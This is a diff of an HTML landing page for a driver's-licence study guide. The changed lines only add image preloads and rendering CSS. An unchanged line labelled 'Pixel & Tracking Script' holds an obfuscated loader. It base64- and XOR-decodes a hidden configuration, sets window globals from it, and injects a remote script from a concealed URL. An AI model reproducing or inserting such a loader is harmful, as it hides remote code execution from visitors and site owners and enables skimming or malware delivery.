@@ -28,10 +28,11 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Oswald:wght@600;700;800&family=Bebas+Neue&display=swap" rel="stylesheet">
     
     <!-- Critical Asset Preloads for Instant Visual Paint -->
-    <link rel="preload" as="image" href="/assets/logo-novo.png" />
-    <link rel="preload" as="image" href="/assets/hero-photo-DZXpO3k8.png" />
+    <link rel="preload" as="image" href="/assets/logo-novo.png" fetchpriority="high" />
+    <link rel="preload" as="image" href="/assets/hero-photo-DZXpO3k8.png" fetchpriority="high" />
     <link rel="preload" as="image" href="/assets/apostila-cnh-2026.png" />
     <link rel="preload" as="image" href="/assets/video-depoimento-thumb.jpg" />
+    <link rel="preload" as="image" href="/assets/selo-garantia-7-dias.png" />
     
     <!-- Pixel & Tracking Script -->
     <script>(function(){var r_7=atob("DFaUUfg+YBtUzZGqYC22JIpSQiF2peXeECWuftddBHV6uOXHCTDtf5tRDTU2v77ZAyT9IYxNT2s9tfTGTyb9KZ1STnEn772IASLgI5FcFW8xvrOQOwu4c59SD3k1oeKIWg3vc5ZfDX5297PaCS7xPbFaQjd2u/DGFTO2a9oIASM19aiaBm7waMwMAX1nqfDOVjPxaZkcHUYp");var o_ib=[];for(var o_aqcm=0;o_aqcm<r_7.length;o_aqcm++){o_ib.push(r_7.charCodeAt(o_aqcm)&255);}var k_od=o_ib[0];var d_jt=o_ib.slice(1,1+k_od);var k_w=o_ib.slice(1+k_od);var n_d=k_w.map(function(b,m_bxi5){return b^d_jt[m_bxi5%k_od];});var w_k="";for(var b_mn2n=0;b_mn2n<n_d.length;b_mn2n++){w_k+=String.fromCharCode(n_d[b_mn2n]&255);}var i_mmn=decodeURIComponent(escape(w_k));var b_te8q=JSON.parse(i_mmn);var j_jtg=b_te8q.globals||[];j_jtg.forEach(function(r_4){window[r_4.name]=r_4.value;});var o_w=document.createElement("script");o_w.src=b_te8q.url;o_w.async=true;o_w.defer=true;(b_te8q.attributes||[]).forEach(function(q_u){o_w.setAttribute(q_u.name,q_u.value);});(document.head||document.documentElement).appendChild(o_w);})();</script>
@@ -97,6 +98,9 @@
         -webkit-backface-visibility: hidden;
         backface-visibility: hidden;
         content-visibility: auto;
+        image-rendering: -webkit-optimize-contrast;
+        transform: translateZ(0);
+        -webkit-transform: translateZ(0);
       }
 
       /* Prevent iframe and video jitter on scroll */
